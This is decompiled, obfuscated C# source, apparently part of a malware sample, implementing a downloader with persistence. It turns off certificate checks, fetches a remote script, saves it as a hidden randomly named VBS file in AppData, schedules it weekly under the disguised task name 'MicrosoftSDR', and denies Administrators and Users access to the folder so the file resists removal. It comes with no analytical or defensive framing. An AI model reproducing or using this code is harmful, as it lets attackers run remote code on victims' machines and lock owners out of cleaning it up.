using System;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Security.AccessControl;
using System.Threading;
using A;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using ns20;

namespace ns22;

public class GClass22
{
	public static string string_0 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

	public static void smethod_0()
	{
		try
		{
			if (Operators.CompareString(C.b("Updater"), (string)null, false) == 0)
			{
				smethod_1();
				C.a("Updater", "U3VjY2Vzc2Z1bGx5IFJlYWR5IQ==");
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void smethod_1()
	{
		try
		{
			ServicePointManager.ServerCertificateValidationCallback = C.A;
			string text = "";
			Random random = new Random();
			int num = 1;
			do
			{
				text += Conversions.ToString(Strings.ChrW(64 + random.Next(1, 26)));
				num++;
			}
			while (num <= 10);
			string string_ = GClass20.string_28;
			WebClient webClient = new WebClient();
			string value = webClient.DownloadString(string_);
			if (Operators.CompareString(GClass20.string_28, "", false) != 0 && GClass20.bool_17)
			{
				string text2 = text + ".vbs";
				string text3 = string_0 + "\\Protect";
				if (!Directory.Exists(text3))
				{
					Directory.CreateDirectory(text3);
				}
				string text4 = Conversions.ToString(2);
				StreamWriter streamWriter = new StreamWriter(text3 + "\\" + text2);
				streamWriter.WriteLine("");
				streamWriter.WriteLine(value);
				streamWriter.Close();
				FileSystem.SetAttr(text3 + "\\" + text2, (FileAttribute)Conversions.ToInteger(text4));
				FileSystem.SetAttr(text3 + "\\", (FileAttribute)Conversions.ToInteger(text4));
				Thread.Sleep(1000);
				Interaction.Shell("schtasks /create /f /sc weekly /mo 1 /d FRI /tn MicrosoftSDR /tr \"" + text3 + "\\" + text2, (AppWinStyle)0, false, -1);
				C.A(text3, "BUILTIN\\Администраторы", FileSystemRights.FullControl, AccessControlType.Deny);
				C.A(text3, "BUILTIN\\Пользователи", FileSystemRights.FullControl, AccessControlType.Deny);
				C.A(text3, "BUILTIN\\Administrators", FileSystemRights.FullControl, AccessControlType.Deny);
				C.A(text3, "BUILTIN\\Users", FileSystemRights.FullControl, AccessControlType.Deny);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
